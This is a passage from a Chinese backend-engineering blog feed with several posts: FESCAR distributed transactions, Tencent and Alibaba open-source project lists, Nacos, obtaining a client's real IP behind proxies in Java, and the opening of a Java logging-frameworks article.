个服务，每个服务对应一个数据库。</p><p>本地事务当然也可以保证每个服务中的数据一致性，但是扩展到整个应用、整个业务逻辑范围来看，情况如何呢？</p><p><img src="http://img.javastack.cn/19-1-11/72000462.jpg"></p><h2 id="FESCAR-机制"><a href="#FESCAR-机制" class="headerlink" title="FESCAR 机制"></a>FESCAR 机制</h2><p>FESCAR 就是用于解决上述微服务架构中的事务问题的解决方案。</p><p><img src="http://img.javastack.cn/19-1-11/37120997.jpg"></p><p>如下图所示，分布式事务是一个全局事务（Global Transaction），由一批分支事务（Branch Transation）组成，通常分支事务只是本地事务。</p><p><img src="http://img.javastack.cn/19-1-11/22419245.jpg"></p><h2 id="FESCAR-中有三大基本组件"><a href="#FESCAR-中有三大基本组件" class="headerlink" title="FESCAR 中有三大基本组件"></a>FESCAR 中有三大基本组件</h2><p><strong>Transaction Coordinator(TC)：</strong> 维护全局和分支事务的状态，驱动全局事务提交与回滚。</p><p><strong>Transaction Manager(TM)</strong> 定义全局事务的范围：开始、提交或回滚全局事务。</p><p><strong>Resource Manager(RM)</strong> 管理分支事务处理的资源，与 TC 通信以注册分支事务并报告分支事务的状态，并驱动分支事务提交或回滚。</p><p><img src="http://img.javastack.cn/19-1-11/3644777.jpg"></p><h2 id="FESCAR-管理分布式事务的典型生命周期"><a href="#FESCAR-管理分布式事务的典型生命周期" class="headerlink" title="FESCAR 管理分布式事务的典型生命周期"></a>FESCAR 管理分布式事务的典型生命周期</h2><p>1、TM 要求 TC 开始新的全局事务，TC 生成表示全局事务的 XID。</p><p>2、XID 通过微服务的调用链传播。</p><p>3、RM 在 TC 中将本地事务注册为 XID 的相应全局事务的分支。</p><p>4、TM 要求 TC 提交或回滚 XID 的相应全局事务。</p><p>5、TC 驱动 XID 的相应全局事务下的所有分支事务，完成分支提交或回滚。</p><p><img src="http://img.javastack.cn/19-1-11/75896368.jpg"></p><h2 id="演进历史"><a href="#演进历史" class="headerlink" title="演进历史"></a>演进历史</h2><p><strong>TXC：</strong> Taobao Transaction Constructor，阿里巴巴中间件团队自 2014 年起启动该项目，以满足应用程序架构从单一服务变为微服务所导致的分布式事务问题。</p><p><strong>GTS：</strong> Global Transaction Service，2016 年 TXC 作为阿里中间件的产品，更名为 GTS 发布。</p><p><strong>FESCAR：</strong> 2019 年开始基于 TXC&#x2F;GTS 开源 FESCAR。</p><p>GTS 本是阿里的商用付费方案，现在开源为：FESCAR，真是惊喜啊，2019 真是好戏多多啊，2019年让我们期待更多的好戏吧~！</p><p><strong>参考：</strong></p><ul><li>github.com&#x2F;alibaba&#x2F;fescar</li><li>oschina.net&#x2F;p&#x2F;fescar</li></ul><p>关于分布式事务的更多可行性方案，大家也可以参考这篇文章：《<a href="https://mp.weixin.qq.com/s/qn_9Jc8Qo7PWT5_G_qm5xQ">分布式事务不理解？一次给你讲清楚！</a>》。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯，排行前10的开源项目</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6/%E8%85%BE%E8%AE%AF%EF%BC%8C%E6%8E%92%E8%A1%8C%E5%89%8D10%E7%9A%84%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6/%E8%85%BE%E8%AE%AF%EF%BC%8C%E6%8E%92%E8%A1%8C%E5%89%8D10%E7%9A%84%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="1、Tars"><a href="#1、Tars" class="headerlink" title="1、Tars"></a>1、Tars</h2><p>Tars是腾讯从2008年到今天一直在使用的后台逻辑层的统一应用框架TAF（Total Application Framework），目前支持C++和Java两种语言。该框架为用户提供了涉及到开发、运维、以及测试的一整套解决方案，帮助一个产品或者服务快速开发、部署、测试、上线。 它集可扩展协议编解码、高性能RPC通信框架、名字路由与发现、发布监控、日志统计、配置管理等于一体，通过它可以快速用微服务的方式构建自己的稳定可靠的分布式应用，并实现完整有效的服务治理。</p><h2 id="2、xLua"><a href="#2、xLua" class="headerlink" title="2、xLua"></a>2、xLua</h2><p>Unity3D下Lua编程支持，xLua为Unity3D增加Lua脚本编程的能力，进而提供代码逻辑增量更新的可能。当然不仅仅如此，在coco2dx上的实践告诉我们，以Lua为主打语言的游戏客户端编程是可行的。</p><h2 id="3、WeUI"><a href="#3、WeUI" class="headerlink" title="3、WeUI"></a>3、WeUI</h2><p>WeUI是由微信官方设计团队专为微信移动Web应用设计的UI 库。WeUI是一套同微信原生视觉体验一致的基础样式库，为微信Web开发量身设计，可以令用户的使用感知更加统一。包含button、cell、dialog、toast、article、icon等各式元素。</p><h2 id="4、PaxosStore"><a href="#4、PaxosStore" class="headerlink" title="4、PaxosStore"></a>4、PaxosStore</h2><p>PaxosStore是一个在跨园区数据中心间同步复制，提供灵活的数据模式和访问接口，并支持单表亿行，具备快速伸缩能力，低延迟低成本，强一致性和高可用的分布式存储系统。</p><h2 id="5、PhxQueue"><a href="#5、PhxQueue" class="headerlink" title="5、PhxQueue"></a>5、PhxQueue</h2><p>PhxQueue目前在微信内部广泛支持微信支付、公众平台等多个重要业务，日均入队达千亿，分钟入队峰值达一亿。其设计出发点是高数据可靠性，且不失高可用和高吞吐，同时支持多种常见队列特性。</p><h2 id="6、Mars"><a href="#6、Mars" class="headerlink" title="6、Mars"></a>6、Mars</h2><p>Mars是微信官方的终端基础组件，是一个使用C++编写的业务性无关、平台性无关的基础组件。目前已接入微信 Android、iOS、Mac、Windows、WP 等客户端。</p><h2 id="7、PhxSQL"><a href="#7、PhxSQL" class="headerlink" title="7、PhxSQL"></a>7、PhxSQL</h2><p>PhxSQL是一个兼容MySQL、服务高可用、数据强一致的关系型数据库集群。PhxSQL以单Master多Slave方式部署，在集群内超过一半机器存活的情况下，可自身实现自动Master切换，且保证数据一致性。</p><h2 id="8、Angel"><a href="#8、Angel" class="headerlink" title="8、Angel"></a>8、Angel</h2><p>Angel是一个基于参数服务器（Parameter Server）理念开发的高性能分布式机器学习平台，它基于腾讯内部的海量数据进行了反复的调优，并具有广泛的适用性和稳定性，模型维度越高，优势越明显。Angel 由腾讯和北京大学联合开发，兼顾了工业界的高可用性和学术界的创新性。</p><h2 id="9、AlloyImage"><a href="#9、AlloyImage" class="headerlink" title="9、AlloyImage"></a>9、AlloyImage</h2><p>一个基于HTML5技术的专业级图像处理引擎——AlloyImage(简称AI)，以及一个在线Web图像处理平台——AlloyPhoto(简称AP)。</p><h2 id="10、JX"><a href="#10、JX" class="headerlink" title="10、JX"></a>10、JX</h2><p>JX是Javascript eXtension tools的缩写，即Javascript 扩展工具套件的意思。JX是模块化的非侵入式Web前端框架，开发于2008年，并于2009年开源。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里启动新项目：Nacos，比 Eureka 更强！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6/%E9%98%BF%E9%87%8C%E5%90%AF%E5%8A%A8%E6%96%B0%E9%A1%B9%E7%9B%AE%EF%BC%9ANacos%EF%BC%8C%E6%AF%94%20Eureka%20%E6%9B%B4%E5%BC%BA%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6/%E9%98%BF%E9%87%8C%E5%90%AF%E5%8A%A8%E6%96%B0%E9%A1%B9%E7%9B%AE%EF%BC%9ANacos%EF%BC%8C%E6%AF%94%20Eureka%20%E6%9B%B4%E5%BC%BA%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-11-21/1234410.jpg"></p><h2 id="什么是-Nacos？"><a href="#什么是-Nacos？" class="headerlink" title="什么是 Nacos？"></a>什么是 Nacos？</h2><p>Nacos 是阿里巴巴推出来的一个新开源项目，这是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</p><p>Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。</p><p>Nacos 帮助您更敏捷和容易地构建、交付和管理微服务平台。 Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。</p><blockquote><p>官网：<a href="https://nacos.io/">https://nacos.io</a></p></blockquote><blockquote><p>源码：<a href="https://github.com/alibaba/nacos">https://github.com/alibaba/nacos</a></p></blockquote><p>全景图：</p><p><img src="http://img.javastack.cn/18-11-21/54787075.jpg"></p><h2 id="架构及概念"><a href="#架构及概念" class="headerlink" title="架构及概念"></a>架构及概念</h2><p><img src="http://img.javastack.cn/18-11-21/95099270.jpg"></p><ul><li><strong>服务 (Service)</strong></li></ul><p>服务是指一个或一组软件功能（例如特定信息的检索或一组操作的执行），其目的是不同的客户端可以为不同的目的重用（例如通过跨进程的网络调用）。Nacos 支持主流的服务生态，如 Kubernetes Service、gRPC|Dubbo RPC Service 或者 Spring Cloud RESTful Service.</p><ul><li><strong>服务注册中心 (Service Registry)</strong></li></ul><p>服务注册中心，它是服务，其实例及元数据的数据库。服务实例在启动时注册到服务注册表，并在关闭时注销。服务和路由器的客户端查询服务注册表以查找服务的可用实例。服务注册中心可能会调用服务实例的健康检查 API 来验证它是否能够处理请求。</p><ul><li><strong>服务元数据 (Service Metadata)</strong></li></ul><p>服务元数据是指包括服务端点(endpoints)、服务标签、服务版本号、服务实例权重、路由规则、安全策略等描述服务的数据</p><ul><li><strong>服务提供方 (Service Provider)</strong></li></ul><p>是指提供可复用和可调用服务的应用方</p><ul><li><strong>服务消费方 (Service Consumer)</strong></li></ul><p>是指会发起对某个服务调用的应用方</p><ul><li><strong>配置 (Configuration)</strong></li></ul><p>在系统开发过程中通常会将一些需要变更的参数、变量等从代码中分离出来独立管理，以独立的配置文件的形式存在。目的是让静态的系统工件或者交付物（如 WAR，JAR 包等）更好地和实际的物理运行环境进行适配。配置管理一般包含在系统部署的过程中，由系统管理员或者运维人员完成这个步骤。配置变更是调整系统运行时的行为的有效手段之一。</p><ul><li><strong>配置管理 (Configuration Management)</strong></li></ul><p>在数据中心中，系统中所有配置的编辑、存储、分发、变更管理、历史版本管理、变更审计等所有与配置相关的活动统称为配置管理。</p><ul><li><strong>名字服务 (Naming Service)</strong></li></ul><p>提供分布式系统中所有对象(Object)、实体(Entity)的“名字”到关联的元数据之间的映射管理服务，例如 ServiceName -&gt; Endpoints Info, Distributed Lock Name -&gt; Lock Owner&#x2F;Status Info, DNS Domain Name -&gt; IP List, 服务发现和 DNS 就是名字服务的2大场景。</p><ul><li><strong>配置服务 (Configuration Service)</strong></li></ul><p>在服务或者应用运行过程中，提供动态配置或者元数据以及配置管理的服务提供者。</p><h2 id="Nacos-vs-Spring-Cloud"><a href="#Nacos-vs-Spring-Cloud" class="headerlink" title="Nacos vs Spring Cloud"></a>Nacos vs Spring Cloud</h2><p>相对于 Spring Cloud Eureka 来说，Nacos 更强大。</p><p>Nacos &#x3D; Spring Cloud Eureka + Spring Cloud Config</p><p>Nacos 可以与 Spring, Spring Boot, Spring Cloud 集成，并能代替 Spring Cloud Eureka, Spring Cloud Config。</p><ul><li>通过 Nacos Server 和 spring-cloud-starter-alibaba-nacos-config 实现配置的动态变更。</li><li>通过 Nacos Server 和 spring-cloud-starter-alibaba-nacos-discovery 实现服务的注册与发现。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>Nacos 官方文档。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里巴巴，排行前 10 的开源项目</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6/%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%EF%BC%8C%E6%8E%92%E8%A1%8C%E5%89%8D%2010%20%E7%9A%84%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6/%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%EF%BC%8C%E6%8E%92%E8%A1%8C%E5%89%8D%2010%20%E7%9A%84%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="1、FastDFS"><a href="#1、FastDFS" class="headerlink" title="1、FastDFS"></a>1、FastDFS</h2><p>FastDFS是一个开源的分布式文件系统，她对文件进行管理，功能包括：文件存储、文件同步、文件访问（文件上传、文件下载）等，解决了大容量存储和负载均衡的问题。特别适合以文件为载体的在线服务，如相册网站、视频网站等等。</p><h2 id="2、Dubbo"><a href="#2、Dubbo" class="headerlink" title="2、Dubbo"></a>2、Dubbo</h2><p>Dubbo 是阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的RPC实现服务的输出和输入功能，可以和 Spring 框架无缝集成。</p><h2 id="3、Druid"><a href="#3、Druid" class="headerlink" title="3、Druid"></a>3、Druid</h2><p>Druid是Java语言中最好的数据库连接池。Druid能够提供强大的监控和扩展功能。</p><h2 id="4、Fastjson"><a href="#4、Fastjson" class="headerlink" title="4、Fastjson"></a>4、Fastjson</h2><p>fastjson是一个性能很好的Java语言实现的JSON解析器和生成器，来自阿里巴巴的工程师开发。</p><h2 id="5、RocketMQ"><a href="#5、RocketMQ" class="headerlink" title="5、RocketMQ"></a>5、RocketMQ</h2><p>RocketMQ是一款开源的分布式消息系统，基于高可用分布式集群技术，提供低延时的、高可靠的消息发布与订阅服务。同时，广泛应用于多个领域，包括异步通信解耦、企业解决方案、金融支付、电信、电子商务、快递物流、广告营销、社交、即时通信、移动应用、手游、视频、物联网、车联网等。</p><h2 id="6、OceanBase"><a href="#6、OceanBase" class="headerlink" title="6、OceanBase"></a>6、OceanBase</h2><p>OceanBase是一个支持海量数据的高性能分布式数据库系统，实现了数千亿条记录、数百TB数据上的跨行跨表事务，由淘宝核心系统研发部、运维、DBA、广告、应用研发等部门共同完成。</p><h2 id="7、Weex"><a href="#7、Weex" class="headerlink" title="7、Weex"></a>7、Weex</h2><p>Weex是一款跨平台移动开发工具，能够完美兼顾性能与动态性，让移动开发者通过简捷的前端语法写出Native级别的性能体验，并支持iOS、安卓、YunOS及Web等多端部署。</p><h2 id="8、Tair"><a href="#8、Tair" class="headerlink" title="8、Tair"></a>8、Tair</h2><p>Tair是由淘宝网自主开发的Key&#x2F;Value结构数据存储系统，在淘宝网有着大规模的应用。您在登录淘宝、查看商品详情页面或者在淘江湖和好友“捣浆糊”的时候，都在直接或间接地和Tair交互。</p><h2 id="9、Tsar"><a href="#9、Tsar" class="headerlink" title="9、Tsar"></a>9、Tsar</h2><p>Tsar是淘宝的采集工具，主要用来收集服务器的系统信息（如cpu，io，mem，tcp等）以及应用数据（如squid haproxy nginx等），tsar支持实时查看和历史查看，方便了解应用和服务器的信息。</p><h2 id="10、AliSQL"><a href="#10、AliSQL" class="headerlink" title="10、AliSQL"></a>10、AliSQL</h2><p>AliSQL是基于MySQL官方版本的一个分支，由阿里云数据库团队维护，目前也应用于阿里巴巴集团业务以及阿里云数据库服务。该版本在社区版的基础上做了大量的性能与功能的优化改进。尤其适合电商、云计算以及金融等行业环境。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 正确获取客户端真实 IP 方法整理</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%97%A5%E5%BF%97/Java%20%E6%AD%A3%E7%A1%AE%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9C%9F%E5%AE%9E%20IP%20%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%97%A5%E5%BF%97/Java%20%E6%AD%A3%E7%A1%AE%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9C%9F%E5%AE%9E%20IP%20%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-2-4/79455273.jpg" alt="image"></p><p>在JSP里，获取客户端的IP地址的方法是：request.getRemoteAddr()，这种方法在大部分情况下都是有效的。但是在通过了Apache，Squid等反向代理软件就不能获取到客户端的真实IP地址了。</p><p>如果使用了反向代理软件，将<a href="http://192.168.1.110:2046/%E7%9A%84URL%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%BAhttp://www.abc.com/%E7%9A%84URL%E6%97%B6%EF%BC%8C%E7%94%A8request.getRemoteAddr()%E6%96%B9%E6%B3%95%E8%8E%B7%E5%8F%96%E7%9A%84IP%E5%9C%B0%E5%9D%80%E6%98%AF%EF%BC%9A127.0.0.1%E6%88%96192.168.1.110%EF%BC%8C%E8%80%8C%E5%B9%B6%E4%B8%8D%E6%98%AF%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E7%9C%9F%E5%AE%9EIP%E3%80%82">http://192.168.1.110:2046/的URL反向代理为http://www.abc.com/的URL时，用request.getRemoteAddr()方法获取的IP地址是：127.0.0.1或192.168.1.110，而并不是客户端的真实IP。</a></p><p>经过代理以后，由于在客户端和服务之间增加了中间层，因此服务器无法直接拿到客户端的IP，服务器端应用也无法直接通过转发请求的地址返回给客户端。但是在转发请求的HTTP头信息中，增加了X-FORWARDED-FOR信息。用以跟踪原有的客户端IP地址和原来客户端请求的服务器地址。</p><p>当我们访问<a href="http://www.abc.com/index.jsp/%E6%97%B6%EF%BC%8C%E5%85%B6%E5%AE%9E%E5%B9%B6%E4%B8%8D%E6%98%AF%E6%88%91%E4%BB%AC%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9C%9F%E6%AD%A3%E8%AE%BF%E9%97%AE%E5%88%B0%E4%BA%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84index.jsp%E6%96%87%E4%BB%B6%EF%BC%8C%E8%80%8C%E6%98%AF%E5%85%88%E7%94%B1%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%BB%E8%AE%BF%E9%97%AEhttp://192.168.1.110%EF%BC%9A2046/index.jsp%EF%BC%8C%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%8D%E5%B0%86%E8%AE%BF%E9%97%AE%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%9C%E8%BF%94%E5%9B%9E%E7%BB%99%E6%88%91%E4%BB%AC%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%98%AF%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%BB%E8%AE%BF%E9%97%AEindex.jsp%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5index.jsp%E4%B8%AD%E9%80%9A%E8%BF%87request.getRemoteAddr()%E7%9A%84%E6%96%B9%E6%B3%95%E8%8E%B7%E5%8F%96%E7%9A%84IP%E5%AE%9E%E9%99%85%E4%B8%8A%E6%98%AF%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%B9%B6%E4%B8%8D%E6%98%AF%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84IP%E5%9C%B0%E5%9D%80%E3%80%82">http://www.abc.com/index.jsp/时，其实并不是我们浏览器真正访问到了服务器上的index.jsp文件，而是先由代理服务器去访问http://192.168.1.110：2046/index.jsp，代理服务器再将访问到的结果返回给我们的浏览器，因为是代理服务器去访问index.jsp的，所以index.jsp中通过request.getRemoteAddr()的方法获取的IP实际上是代理服务器的地址，并不是客户端的IP地址。</a></p><p><strong>外界流传的JAVA&#x2F;PHP服务器端获取客户端IP都是这么取的：</strong></p><p>伪代码：</p><p>1）ip &#x3D; request.getHeader(“X-FORWARDED-FOR “)</p><p>2）如果该值为空或数组长度为0或等于”unknown”，那么：<br>ip &#x3D; request.getHeader(“Proxy-Client-IP”)</p><p>3）如果该值为空或数组长度为0或等于”unknown”，那么：<br>ip &#x3D; request.getHeader(“WL-Proxy-Client-IP”)</p><p>4）如果该值为空或数组长度为0或等于”unknown”，那么：<br>ip &#x3D; request.getHeader(“HTTP_CLIENT_IP”)</p><p>5）如果该值为空或数组长度为0或等于”unknown”，那么：<br>ip &#x3D; request.getHeader(“X-Real-IP”)</p><p>6）如果该值为空或数组长度为0或等于”unknown”，那么：<br>ip &#x3D; request.getRemoteAddr ()</p><p><strong>先说说这些请求头的意思</strong></p><ul><li>X-Forwarded-For</li></ul><p>这是一个 Squid 开发的字段，只有在通过了HTTP代理或者负载均衡服务器时才会添加该项。</p><p>格式为X-Forwarded-For:client1,proxy1,proxy2，一般情况下，第一个ip为客户端真实ip，后面的为经过的代理服务器ip。现在大部分的代理都会加上这个请求头。</p><ul><li>Proxy-Client-IP&#x2F;WL- Proxy-Client-IP</li></ul><p>这个一般是经过apache http服务器的请求才会有，用apache http做代理时一般会加上Proxy-Client-IP请求头，而WL-Proxy-Client-IP是他的weblogic插件加上的头。</p><ul><li>HTTP_CLIENT_IP</li></ul><p>有些代理服务器会加上此请求头。</p><ul><li>X-Real-IP<br>nginx代理一般会加上此请求头。</li></ul><p><strong>下面是一个参考获取客户端IP地址的方法：</strong></p><pre class="line-numbers language-none"><code class="language-none">public static String getIpAddress(HttpServletRequest request) &#123;String ip &#x3D; request.getHeader(&quot;x-forwarded-for&quot;);if (ip &#x3D;&#x3D; null || ip.length() &#x3D;&#x3D; 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;ip &#x3D; request.getHeader(&quot;Proxy-Client-IP&quot;);&#125;if (ip &#x3D;&#x3D; null || ip.length() &#x3D;&#x3D; 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;ip &#x3D; request.getHeader(&quot;WL-Proxy-Client-IP&quot;);&#125;if (ip &#x3D;&#x3D; null || ip.length() &#x3D;&#x3D; 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;ip &#x3D; request.getRemoteAddr();&#125;if (ip.contains(&quot;,&quot;)) &#123;return ip.split(&quot;,&quot;)[0];&#125; else &#123;return ip;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果使用的是Druid连接池，可以参考使用：com.alibaba.druid.util.DruidWebUtils#getRemoteAddr方法，但这个是经过多级代理的IP地址，需要自己处理下获取第一个。</p></blockquote><p><strong>有几点要注意</strong></p><ol><li><p>这些请求头都不是http协议里的标准请求头，也就是说这个是各个代理服务器自己规定的表示客户端地址的请求头。如果哪天有一个代理服务器软件用oooo-client-ip这个请求头代表客户端请求，那上面的代码就不行了。</p></li><li><p>这些请求头不是代理服务器一定会带上的，网络上的很多匿名代理就没有这些请求头，所以获取到的客户端ip不一定是真实的客户端ip。代理服务器一般都可以自定义请求头设置。</p></li><li><p>即使请求经过的代理都会按自己的规范附上代理请求头，上面的代码也不能确保获得的一定是客户端ip。不同的网络架构，判断请求头的顺序是不一样的。</p></li><li><p>最重要的一点，请求头都是可以伪造的。如果一些对客户端校验较严格的应用（比如投票）要获取客户端ip，应该直接使用ip&#x3D;request.getRemoteAddr()，虽然获取到的可能是代理的ip而不是客户端的ip，但这个获取到的ip基本上是不可能伪造的，也就杜绝了刷票的可能。(有分析说arp欺骗+syn有可能伪造此ip，如果真的可以，这是所有基于TCP协议都存在的漏洞)，这个ip是tcp连接里的ip。</p></li></ol><blockquote><p>参考<br><a href="http://blog.csdn.net/sgx425021234/article/details/19043459/">http://blog.csdn.net/sgx425021234/article/details/19043459\</a><br><a href="http://blog.csdn.net/fengwind1/article/details/51992528">http://blog.csdn.net/fengwind1/article/details/51992528</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 程序如何正确的打日志</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%97%A5%E5%BF%97/Java%20%E7%A8%8B%E5%BA%8F%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%89%93%E6%97%A5%E5%BF%97/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%97%A5%E5%BF%97/Java%20%E7%A8%8B%E5%BA%8F%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%89%93%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是日志"><a href="#什么是日志" class="headerlink" title="什么是日志"></a>什么是日志</h3><p>简单的说，日志就是记录程序的运行轨迹，方便查找关键信息，也方便快速定位解决问题。</p><p>我们Java程序员在开发项目时都是依赖 Eclipse&#x2F; Idea 等开发工具的 Debug 调试功能来跟踪解决 Bug，在开发环境可以这么做，但项目发布到了测试、生产环境呢？你有可能会说可以使用远程调试，但实际并不能允许让你这么做。</p><p>所以，日志的作用就是在测试、生产环境没有 Debug 调试工具时开发、测试人员定位问题的手段。日志打得好，就能根据日志的轨迹快速定位并解决线上问题，反之，日志输出不好不能定位到问题不说反而会影响系统的性能。</p><p>优秀的项目都是能根据日志定位问题的，而不是在线调试，或者半天找不到有用的日志而抓狂…</p><h3 id="常用日志框架"><a href="#常用日志框架" class="headerlink" title="常用日志框架"></a>常用日志框架</h3><p>log4j, Logging, commons-logging, slf4j, logback, 开发的同学对这几个日志相关的技术不陌生吧，为什么有这么多日志技术，它们都是什么区别和联系呢？相信大多数人搞不清楚它们的关系，下面我将一一介绍一下，以后大家再也不用傻傻分不清楚了。</p><ul><li><strong>Logging</strong></li></ul><p>如图所示，这是 Java 自带的日志工具类，在 JDK 1.5 开始就已经有了，在 <code>java.util.logging</code> 包下。</p><p><img src="http://img.javastack.cn/18-5-2/8748931.jpg"></p><p>更多关于 Java Logging 的介绍可以看官方文档。</p><blockquote><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/logging/overview.html">https://docs.oracle.com/javase/8/docs/technotes/guides/logging/overview.html</a></p></blockquote><ul><li><strong>Log4j</strong></li></ul><p>Log4j 是 Apache 的一个开源日志框架，也是市场占有率最多的一个框架。大多数没用过 Java Logging, 但没人敢说没用过 Log4j 吧，反正从我接触 Java 开始就是这种情况，做 Java 项目必有 Log4j 日志框架。</p><p>注意：log4j 在 2015&#x2F;08&#x2F;05 这一天被 Apache 宣布停止维护了，用户需要切换到 Log4j2上面去。</p><p>下面是官方宣布原文：</p><blockquote><p>On August 5, 2015 the Logging Services Project Management Committee announced that Log4j 1.x had reached end of life. For complete text of the announcement please see the Apache Blog. Users of Log4j 1 are recommended to upgrade to Apache Log4j 2.</p></blockquote><p>Log4j2 的官方地址：</p><blockquote><p><a href="https://logging.apache.org/log4j/2.x/">https://logging.apache.org/log4j/2.x/</a></p></blockquote><ul><li><strong>commons-logging</strong></li></ul><p>上面介绍的 log4j 是一个具体的日志框架的实现，而 commons-logging 就是日志的门面接口，它也是 apache 最早提供的日志门面接口，用户可以根据喜好选择不同的日志实现框架，而不必改动日志定义，这就是日志门面的好处，符合面对接口抽象编程。</p><p>更多的详细说明可以参考官方说明：</p><blockquote><p><a href="http://commons.apache.org/proper/commons-logging/">http://commons.apache.org/proper/commons-logging/</a></p></blockquote><ul><li><strong>Slf4j</strong></li></ul><p>全称：Simple Logging Facade for Java，即简单日志门面接口，和 Apache 的 commons-logging 是一样的概念，它们都不是具体的日志框架，你可以指定其他主流的日志实现框架。</p><p>Slf4j 的官方地址：</p><blockquote><p><a href="https://www.slf4j.org/">https://www.slf4j.org/</a></p></blockquote><p>Slf4j 也是现在主流的日志门面框架，使用 Slf4j 可以很灵活的使用占位符进行参数占位，简化代码，拥有更好的可读性，这个后面会讲到。</p><ul><li><strong>Logback</strong></li></ul><p>Logback 是 <code>Slf4j </code> 的原生实现框架，同样也是出自 <code>Log4j</code> 一个人之手，但拥有比 <code>log4j</code> 更多的优点、特性和更做强的性能，现在基本都用来代替 <code>log4j</code> 成为主流。</p><p>Logback 的官方地址：</p><blockquote><p><a href="https://logback.qos.ch/">https://logback.qos.ch/</a></p></blockquote><p><strong>为什么 Logback 